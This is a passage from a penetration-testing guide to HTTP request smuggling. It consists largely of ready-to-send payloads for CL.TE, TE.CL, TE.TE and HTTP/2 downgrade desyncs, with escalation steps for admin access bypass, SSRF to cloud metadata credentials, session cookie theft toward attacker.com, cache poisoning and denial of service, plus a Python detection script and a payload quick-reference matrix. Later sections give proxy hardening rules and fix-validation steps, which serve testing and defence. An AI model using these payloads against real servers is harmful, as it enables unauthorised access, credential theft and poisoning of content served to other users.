### 4.4 TE.TE to TE.CL Conversion

If obfuscation causes the back-end to ignore TE (uses CL) while the front-end processes TE:

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chünked

5e
GET /admin HTTP/1.1
Host: example.com
Content-Length: 15

x=1
0

```

### 4.5 Systematic TE.TE Fuzzing Matrix

Test each obfuscation by sending the payload and observing whether the connection times out (indicating one server is waiting) or returns immediately.

| Obfuscation | Expected CL.TE Behavior | Expected TE.CL Behavior |
|-------------|------------------------|------------------------|
| `Transfer-Encoding: chünked` | Front-end ignores TE, uses CL. Back-end processes TE. | Front-end processes TE. Back-end ignores TE, uses CL. |
| `Transfer-Encoding : chunked` | Front-end ignores TE, uses CL. Back-end processes TE. | Front-end processes TE. Back-end ignores TE, uses CL. |
| `Transfer-Encoding: chunked\r\nTransfer-Encoding: identity` | Front-end uses first (chunked). Back-end uses last (identity/CL). | Front-end uses first. Back-end uses last. |
| `Transfer-Encoding:\n chunked` | Front-end ignores. Back-end processes. | Front-end processes. Back-end ignores. |

---

### 5.1 Attack Mechanics

Request Tunnelling (also called "Complete Request Smuggling" or "Single-Packet Attack") occurs when the smuggled request is a complete, valid HTTP request that the back-end processes independently of the wrapper request. This is the most powerful form of smuggling because the smuggled request can have its own headers, body, and method, completely bypassing front-end access controls.

### 5.2 Single-Packet Attack

Modern HTTP/1.1 implementations and HTTP/2 multiplexing allow multiple requests to be sent in a single TCP packet or TLS record. By sending the wrapper and smuggled requests together, the attacker ensures they arrive atomically at the front-end, reducing the chance of interference from other users' requests.

**CL.TE Single-Packet Payload:**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 200
Transfer-Encoding: chunked

0

POST /admin/delete-user HTTP/1.1
Host: example.com
Cookie: session=ATTACKER_SESSION
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

user=victim
GET / HTTP/1.1
Host: example.com
```

**Sending Strategy:**
1. Open a single TCP connection.
2. Send the entire payload above in one `send()` call.
3. The front-end processes the wrapper POST (CL=200, reads until end of smuggled request).
4. The back-end processes TE, sees `0\r\n\r\n`, then processes the complete smuggled POST request.
5. The trailing `GET / HTTP/1.1` is either ignored or processed as a third request depending on buffering.

### 5.3 Last-Byte Synchronization

To ensure the front-end and back-end agree on the boundary without leaving dangling data:

**CL.TE with Precise Length:**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 178
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: example.com
X-Ignore: x
```

Calculate CL so that the final byte of the smuggled request aligns exactly with what the front-end expects.

### 5.4 Request Tunnelling for Access Control Bypass

**Scenario:** Front-end blocks `/admin` based on IP or path, but the back-end does not.

**Wrapper Request (Allowed Path):**
```http
POST /api/public/feedback HTTP/1.1
Host: example.com
Content-Length: 250
Transfer-Encoding: chunked

0

GET /admin/users HTTP/1.1
Host: example.com
X-Original-Url: /admin/users
Cookie: admin_session=true
```

The front-end sees `/api/public/feedback` (allowed). The back-end processes the smuggled `GET /admin/users`.

### 5.5 Request Tunnelling for Method Override

Smuggle a privileged method inside a permitted wrapper:

```http
POST /api/upload HTTP/1.1
Host: example.com
Content-Length: 150
Transfer-Encoding: chunked

0

DELETE /api/critical-resource HTTP/1.1
Host: example.com
Authorization: Bearer admin-token
```

---

### 6.1 SSRF via Request Smuggling

Force the back-end to make requests to internal services by smuggling a request that triggers internal API calls.

**CL.TE SSRF to Internal Metadata:**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 250
Transfer-Encoding: chunked

0

POST /internal/webhook HTTP/1.1
Host: 169.254.169.254
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

url=http://169.254.169.254/latest/meta-data/
```

**Mechanism:** The back-end processes the smuggled POST to `/internal/webhook`, which triggers an SSRF to the cloud metadata service.

**AWS IMDSv2 via Smuggling:**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 300
Transfer-Encoding: chunked

0

PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 21600
Content-Length: 0

GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token: TOKEN_FROM_PREVIOUS
```

### 6.2 Credential Hijacking (Session Fixation / Theft)

Poison a victim's request to make them send their session cookie to an attacker-controlled endpoint.

**CL.TE Credential Hijacking:**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 300
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Host: attacker.com
Content-Length: 100

Cookie: 
```

**Mechanism:**
1. Attacker sends the smuggling payload.
2. Victim's browser sends a legitimate request on the same connection.
3. The back-end interprets the victim's request as the body of the smuggled request:
```http
GET / HTTP/1.1
Host: attacker.com
Content-Length: 100

Cookie: victim_session=abc123; ...
```
4. The victim's cookies are sent in the body to `attacker.com` (if the application makes a subsequent request based on the smuggled Host) OR the response is redirected to attacker.com with the cookie.

**More Reliable: Reflected Cookie Theft via Smuggled Redirect**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 200
Transfer-Encoding: chunked

0

GET /redirect?to=https://attacker.com/steal HTTP/1.1
Host: example.com
Cookie: trigger=1
```

If the back-end processes this and the next user's request appends their cookies to the smuggled request body, the redirect response may include the victim's session in query parameters or headers.

### 6.3 Cache Poisoning via Request Smuggling

Poison the cache by smuggling a request that generates a malicious response, which the cache then stores and serves.

**CL.TE Cache Poisoning:**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 180
Transfer-Encoding: chunked

0

GET /popular-page HTTP/1.1
Host: example.com
X-Ignore: xGET /popular-page HTTP/1.1
Host: attacker.com
```

**Mechanism:**
1. Front-end sees the wrapper POST. Back-end sees two requests due to TE parsing.
2. The smuggled `GET /popular-page` with `Host: attacker.com` generates a response with attacker-controlled domains (redirects, CSP, CORS, JS config).
3. The cache stores this response under the key for `/popular-page` (as requested by the victim's follow-up request).
4. All subsequent users requesting `/popular-page` receive the poisoned response.

**TE.CL Cache Poisoning:**
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

100
GET /popular-page HTTP/1.1
Host: attacker.com
Content-Length: 100

x=
0

```

### 6.4 Cross-User Data Exposure

Smuggle a request that causes the back-end to return another user's data.

```http
POST /api/graphql HTTP/1.1
Host: example.com
Content-Length: 400
Transfer-Encoding: chunked

0

POST /api/graphql HTTP/1.1
Host: example.com
Content-Type: application/json
Content-Length: 50

{"query":"{ user(id:1) { email password } }"}
```

The next user's request on the connection may be appended to this smuggled body, causing the GraphQL response to be returned to the wrong user or stored in cache.

### 6.5 Desync-Powered DoS

Cause the back-end to enter an infinite loop or process invalid requests by smuggling malformed HTTP.

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 50
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Host: example.com
Content-Length: 1000

[incomplete body]
```

The back-end waits for 1000 bytes of body for the smuggled GET (which never arrives), consuming a worker thread indefinitely.

---

### 7.1 HTTP/2 Request Smuggling (H2.TE / H2.CL)

HTTP/2 to HTTP/1.1 downgrade introduces desync because HTTP/2 uses length-prefixed frames while HTTP/1.1 uses CL/TE.

**H2.TE Attack:**
```http

# HTTP/2 request sent to frontend
:method: POST
:path: /
:scheme: https
:authority: example.com
content-length: 0

# DATA frames contain:
0\r\n\r\n
GET /admin HTTP/1.1\r\n
Host: example.com\r\n
\r\n
```

**Mechanism:** The HTTP/2 frontend forwards the body to the HTTP/1.1 backend. If the backend processes `Transfer-Encoding: chunked` (injected during downgrade or already present), it interprets the body as chunked and the trailing GET is smuggled.

**H2.CL Attack:**
```http

# DATA frames (4 bytes)
AAAA
```

**Mechanism:** If the attacker can inject a `content-length: 1000` header during downgrade (e.g., via header injection in HTTP/2 pseudo-headers), the backend waits for 1000 bytes while the frontend only sent 4 bytes in DATA frames. The next request on the HTTP/1.1 connection completes the body.

### 7.2 HTTP/2 Header Injection (CRLF in Pseudo-Headers)

Some HTTP/2 implementations improperly validate pseudo-header values, allowing CRLF injection that creates fake HTTP/1.1 headers during downgrade.

```http
:authority: example.com\r\n
Transfer-Encoding: chunked\r\n
\r\n
:path: /
```

### 7.3 Header Name Smuggling (HTTP/2)

HTTP/2 allows header names to be binary-encoded. Some implementations translate these to HTTP/1.1 without proper validation.

```http
:method: POST
:path: /
:scheme: https
:authority: example.com
transfer-encoding: chunked    # lowercase, HTTP/2 allows this
content-length: 4
```

During downgrade to HTTP/1.1, some servers normalize `transfer-encoding` to `Transfer-Encoding`, triggering TE processing on the backend while the frontend ignored it.

### 7.4 Chunked Encoding Extensions & Trailers

Abuse chunked extensions to bypass WAFs or confuse parsers.

```http
Transfer-Encoding: chunked

5;ext1=val1;ext2="val2"
hello
0;trailer1=value
Trailer-Header: data
```

Some WAFs fail to parse extensions correctly and allow malicious content through.

### 7.5 Request Smuggling via Upgrade Header

The `Upgrade: h2c` or `Upgrade: websocket` header can cause desync if front-end and back-end disagree on whether the connection is upgraded.

```http
GET / HTTP/1.1
Host: example.com
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
```

### 7.6 Response Queue Desync (Client-Side)

In HTTP/2 multiplexing, smuggling can cause responses to be associated with the wrong stream ID, delivering one user's response to another user.

---

### 8.1 Manual Testing Workflow

For each endpoint accepting POST/PUT bodies:

1. **Baseline** — Send normal request, observe response time and headers
2. **CL.TE timeout test** — Send `Content-Length: 4` + `Transfer-Encoding: chunked` + `1\r\nA\r\n0\r\n\r\n`. If timeout → possible CL.TE
3. **TE.CL timeout test** — Send `Content-Length: 6` + `Transfer-Encoding: chunked` + `0\r\n\r\nX`. If timeout on next request → possible TE.CL
4. **Differential confirmation** — Use double-request technique with a smuggled request to a unique path. Check if follow-up gets smuggled response.
5. **TE.TE fuzzing** — Systematically test all obfuscation variants from Section 4.5
6. **HTTP/2 downgrade testing** — If HTTP/2 is supported, test H2.TE and H2.CL via downgrade
7. **Impact escalation** — Attempt request tunnelling to admin endpoints, SSRF to 169.254.169.254, cache poisoning, credential hijacking
8. **Single-packet attack** — Send wrapper + smuggled + follow-up in one TCP packet for reliability
9. **Connection persistence testing** — Confirm `Connection: keep-alive` is honored by both front-end and back-end

### 8.2 Automation Script Logic (Python Pseudocode)

```python
import socket
import ssl
import time

def send_raw_http(host, port, payload, use_ssl=True):
    context = ssl.create_default_context()
    with socket.create_connection((host, port)) as sock:
        if use_ssl:
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                ssock.sendall(payload.encode())
                return ssock.recv(4096).decode()
        else:
            sock.sendall(payload.encode())
            return sock.recv(4096).decode()

def detect_cl_te(host, port):
    payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "1\r\n"
        "A\r\n"
        "0\r\n"
        "\r\n"
    )
    try:
        send_raw_http(host, port, payload)
        time.sleep(2)
        # Send follow-up
        followup = f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n"
        resp = send_raw_http(host, port, followup)
        if "400" in resp or "timeout" in resp.lower():
            return True  # Likely CL.TE
    except:
        return True
    return False

def detect_te_cl(host, port):
    payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "X"
    )
    try:
        send_raw_http(host, port, payload)
        time.sleep(2)
        followup = f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n"
        resp = send_raw_http(host, port, followup)
        if "400" in resp:
            return True  # Likely TE.CL
    except:
        return True
    return False
```

### 8.3 Recommended Tools

| Tool | Purpose | Notes |
|------|---------|-------|
| **Burp Suite Professional** | Manual desync testing, Repeater, HTTP/2 support | Essential; use Repeater with "Update Content-Length" disabled |
| **Burp BApp: HTTP Request Smuggler** | Automated CL.TE/TE.CL/TE.TE detection | James Kettle's extension; scans automatically |
| **Turbo Intruder** | High-speed single-packet attacks | Use for confirmation and exploitation at scale |
| **http-request-smuggler (CLI)** | Command-line detection | `python smuggler.py -u https://example.com` |
| **curl** | Raw HTTP/1.1 testing | `curl --http1.1 -H "Transfer-Encoding: chunked" ...` |
| **h2smuggler** | HTTP/2 downgrade testing | Specialized for H2.TE / H2.CL |
| **OpenSSL s_client** | Raw TLS testing | `openssl s_client -connect host:443` for manual payload injection |
| **Wireshark/tcpdump** | Connection-level analysis | Verify packet boundaries and request splitting |

---

### 9.1 Secure Architecture Patterns

**Disable Connection Reuse (Nuclear Option):**
```nginx

# nginx
keepalive_timeout 0;
keepalive_requests 1;
```

**Normalize CL and TE at the Edge:**
- Reject requests containing both `Content-Length` and `Transfer-Encoding`.
- If TE is present, strip CL before forwarding.
- If CL is present and TE is absent, validate CL is a non-negative integer.

**HTTP/2 End-to-End:**
- Do not downgrade HTTP/2 to HTTP/1.1 between tiers.
- If downgrade is unavoidable, re-validate all headers at the downgrade point.

**Strict TE Parsing:**
- Reject chunked encoding with invalid chunk sizes.
- Reject chunked extensions if not strictly required.
- Do not support `Transfer-Encoding: identity` (deprecated).

### 9.2 Reverse Proxy / Load Balancer Hardening

**HAProxy:**
```haproxy
frontend http_front
    http-request deny if hdr_cnt(Content-Length) gt 1
    http-request deny if hdr_cnt(Transfer-Encoding) gt 1
    http-request deny if hdr_beg(Content-Length) -
    # Normalize: if TE present, remove CL
    http-request del-header Content-Length if hdr(Transfer-Encoding) -m str chunked
```

**nginx:**
```nginx

# Reject requests with both headers
if ($http_transfer_encoding ~* "chunked") {
    set $te_present 1;
}
if ($http_content_length) {
    set $cl_present 1;
}
if ($te_present = 1) {
    set $both_present $cl_present;
}
if ($both_present = 1) {
    return 400;
}
```

**AWS ALB / CloudFront:**
- Enable HTTP/2 end-to-end where possible.
- Use AWS WAF to block malformed CL/TE combinations.

### 9.3 Application-Level Remediation

- **Never trust Content-Length for security decisions** if TE is also present.
- **Use framework-provided request parsing** rather than manual header inspection.
- **Validate request boundaries** at the application layer by checking for unexpected data after the declared body end.

### 9.4 Verification Steps for Fix Validation

1. **Resubmit CL.TE timeout payload** — Confirm immediate response (no timeout)
2. **Resubmit TE.CL timeout payload** — Confirm immediate response on follow-up
3. **Resubmit TE.TE obfuscation variants** — All should return 400 or use consistent parsing
4. **Test dual-header rejection** — Request with both CL and TE must be rejected (400)
5. **Test HTTP/2 downgrade** — H2.TE and H2.CL payloads should not cause desync
6. **Test single-packet attack** — Smuggled request should not be processed independently
7. **Confirm connection isolation** — Smuggled data on one connection must not affect subsequent requests
8. **Verify cache isolation** — Poisoned responses must not be cached for benign requests
9. **Test with automated scanner** — Run HTTP Request Smuggler / Nuclei to confirm negative

### 9.5 Defense-in-Depth

- **Network Segmentation:** Back-end administrative endpoints should not be reachable from the application server network layer, even if smuggled.
- **Cloud Metadata Protection:** Use IMDSv2 (session-based tokens) on AWS; require `Metadata-Flavor: Google` on GCP; disable legacy IMDSv1.
- **Cache Layer Rules:** Do not cache responses containing `Transfer-Encoding` or responses to POST requests unless explicitly designed.
- **Monitoring:** Alert on requests containing both CL and TE, malformed chunk sizes, or unusual request timing patterns.
- **Rate Limiting:** Limit connection reuse and implement per-connection request caps to reduce smuggling windows.

---

## Quick Reference: Optimized Payload Matrix

| Objective | Payload | Context |
|-----------|---------|---------|
| **CL.TE Detect** | `CL: 4`, `TE: chunked`, body `1\r\nA\r\n0\r\n\r\n` | Timeout = vulnerable |
| **TE.CL Detect** | `CL: 6`, `TE: chunked`, body `0\r\n\r\nX` | Next request timeout = vulnerable |
| **CL.TE Smuggle** | `CL: 50`, `TE: chunked`, `0\r\n\r\nGET /admin...` | Access control bypass |
| **TE.CL Smuggle** | `CL: 4`, `TE: chunked`, `[hex]\r\nGET /admin...` | Access control bypass |
| **TE.TE Obfuscation** | `Transfer-Encoding: chünked` | Bypass both parsers |
| **TE.TE Space** | `Transfer-Encoding : chunked` | Header name spacing |
| **Request Tunnel** | Complete smuggled request inside wrapper | Full request hijacking |
| **SSRF Smuggle** | Smuggle `POST /webhook` targeting `169.254.169.254` | Metadata extraction |
| **Cache Poison** | Smuggle request to cacheable path with hostile Host | Cross-user poisoning |
| **Cred Hijack** | Smuggle request with `Content-Length` consuming victim's next request | Session theft |
| **H2.TE** | HTTP/2 request with chunked body in DATA frames | HTTP/2 downgrade |
| **H2.CL** | HTTP/2 with fake CL causing backend wait | HTTP/2 downgrade |
| **Single-Packet** | Wrapper + smuggled + follow-up in one `send()` | Atomic exploitation |

---

## Testing Notes

- **Always use Repeater with "Update Content-Length" disabled** when crafting smuggling payloads in Burp Suite; automatic CL recalculation will destroy the attack.
- **Calculate chunk sizes precisely** for TE.CL; an incorrect hex length causes the back-end to parse chunk data incorrectly, leading to false negatives.
- **Use single-packet attacks for reliability** in production environments; sending wrapper and smuggled requests in separate packets increases the risk of interference from other users' requests on shared connections.
- **Test on non-production first**; cache poisoning and DoS smuggling can severely impact legitimate users.
- **Check for connection reuse** (`Connection: keep-alive`); if the server closes every connection, smuggling is not viable via connection reuse (though HTTP/2 multiplexing may still allow it).
- **Document server composition** via headers (`Server`, `Via`, `X-Cache`, `X-Powered-By`); mixed technology stacks (nginx → Apache, CloudFront → IIS) have the highest desync probability.
- **Be aware of front-end buffering**; some CDNs buffer the entire request before forwarding, which may normalize CL/TE and prevent smuggling.
- **HTTP/2 is not a silver bullet**; H2.TE and H2.CL vulnerabilities are increasingly common as HTTP/2 adoption grows with improper downgrade implementations.
- **When testing TE.TE, test every obfuscation variant systematically**; different server combinations require different bypasses. Maintain a checklist of at least 20 obfuscation techniques.
